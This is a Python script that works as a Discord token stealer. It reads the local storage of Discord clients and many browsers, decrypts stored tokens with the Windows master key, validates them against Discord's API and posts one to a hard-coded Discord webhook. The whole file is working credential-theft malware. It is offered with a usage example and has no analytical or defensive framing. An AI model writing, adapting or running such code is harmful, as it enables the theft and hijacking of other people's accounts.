import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData


def send_discord_token(webhook: str):
    class ExtractTokens:
        def __init__(self):
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("LOCALAPPDATA")
            self.roaming = os.getenv("APPDATA")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
            self.tokens = []
            self.extract()

        def extract(self):
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming + f'\\{_discord}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{_discord}\\Local State'))
                                if self.validate_token(token):
                                    self.tokens.append(token)
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    self.tokens.append(token)

            if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    self.tokens.append(token)

        def validate_token(self, token: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': token})
            if r.status_code == 200:
                return True
            return False

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

        def get_master_key(self, path: str) -> bytes:
            if not os.path.exists(path):
                return None
            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return None
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    class UploadTokens:
        def __init__(self, webhook: str):
            self.tokens = ExtractTokens().tokens
            self.webhook = webhook

        def upload(self):
            if not self.tokens:
                return

            for token in self.tokens:
                if self.send_webhook_message(f"```{token}```"):
                    break  # Stop after successfully sending one message

        def send_webhook_message(self, message: str) -> bool:
            data = {
                "content": message
            }
            headers = {
                "Content-Type": "application/json"
            }
            try:
                response = requests.post(self.webhook, json=data, headers=headers)
                return response.status_code == 204  # Check if message was successfully sent
            except requests.exceptions.RequestException as e:
                return False  # Ignore any exceptions, continue with program

    uploader = UploadTokens(webhook)
    uploader.upload()

# Пример использования:
if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1245490308263841854/7RYrSGOtbt6gngZq1JYra7SzpU2X-tbuUL6tpGd1ADeGvKr2pGswgrTagz0ENfjNFm-z"
    send_discord_token(webhook_url)
